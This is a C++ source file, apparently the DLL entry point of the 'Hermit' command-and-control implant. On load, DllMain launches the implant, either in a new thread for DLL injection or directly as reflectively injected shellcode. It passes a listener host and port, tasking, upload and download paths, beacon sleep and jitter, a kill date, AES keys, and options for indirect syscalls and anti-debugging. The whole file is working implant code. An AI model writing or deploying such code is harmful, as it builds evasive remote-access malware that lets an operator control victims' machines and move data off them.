#include "hermit.hpp"

#define MAX_THREADS 3

DWORD WINAPI RunWrapper(LPVOID lpParam)
{
    Hermit::Run(
        NULL,
        0,
        PAYLOAD_TYPE_W,
        #ifdef PAYLOAD_INDIRECT_SYSCALLS
		TRUE,
		#else
		FALSE,
		#endif
        #ifdef PAYLOAD_ANTI_DEBUG
        TRUE,
        #else
        FALSE,
        #endif
        LISTENER_PROTOCOL_W,
        LISTENER_HOST_W,
        (INTERNET_PORT)LISTENER_PORT,
        REQUEST_PATH_CHECKIN_W,
        REQUEST_PATH_DOWNLOAD_W,
        REQUEST_PATH_TASKGET_W,
        REQUEST_PATH_TASKRESULT_W,
        REQUEST_PATH_UPLOAD_W,
        REQUEST_PATH_WEBSOCKET_W,
        PAYLOAD_SLEEP,
        PAYLOAD_JITTER,
        PAYLOAD_KILLDATE,
        AES_KEY_BASE64_W,
        AES_IV_BASE64_W
    );

    return 0;
}

DLLEXPORT BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    HANDLE hThread = NULL;

    switch (fdwReason)
    {
        case DLL_QUERY_HMODULE:
            break;
        case DLL_PROCESS_ATTACH:
            #ifdef IS_SHELLCODE
            RunWrapper(nullptr);
            #else
            // Execute the Run function within a new thread
            // because WinHTTP functions are not usable in DllMain when DLL Injection.
            hThread = CreateThread(
                NULL,
                0,
                RunWrapper,
                hinstDLL,
                0,
                NULL
            );
            #endif

            break;
        case DLL_PROCESS_DETACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}

#ifdef IS_SHELLCODE
// This function is called for sRDI (Shellcode Reflective DLL Injection)
// But currently this is not used actually...
DLLEXPORT BOOL Start(LPVOID lpArg, DWORD dwArgLen)
{
    // MessageBoxA(NULL, "Start", "Start", MB_OK);
    return TRUE;
}

#endif // IS_SHELLCODE